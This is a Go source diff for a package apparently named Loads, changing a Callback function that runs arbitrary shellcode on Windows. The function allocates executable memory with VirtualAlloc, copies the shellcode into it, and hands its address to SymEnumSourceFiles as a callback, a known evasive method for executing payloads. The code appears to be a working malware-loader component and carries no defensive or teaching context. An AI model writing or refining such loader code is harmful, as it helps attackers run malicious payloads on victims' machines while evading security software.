@@ -1,6 +1,7 @@
-package TT
+package Loads
 
 import (
+	"golang.org/x/sys/windows"
 	"syscall"
 	"unsafe"
 )
@@ -15,7 +16,6 @@ const (
 	PAGE_EXECUTE_READWRITE = 0x40
 	NULL                   = 0
 	TRUE                   = 1
-	SSRVOPT_DWORDPTR       = 0x00000004
 )
 
 var (
@@ -32,7 +32,7 @@ var (
 func Callback(shellcode []byte) {
 	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-	hProcess, _, _ := GetCurrentProcess.Call()
-	SymInitialize.Call(hProcess, NULL, TRUE)
-	SymEnumSourceFiles.Call(hProcess, NULL, NULL, addr, NULL)
+	hProcess := windows.CurrentProcess()
+	SymInitialize.Call(uintptr(unsafe.Pointer(&hProcess)), NULL, TRUE)
+	SymEnumSourceFiles.Call(uintptr(unsafe.Pointer(&hProcess)), NULL, NULL, addr, NULL)
 }
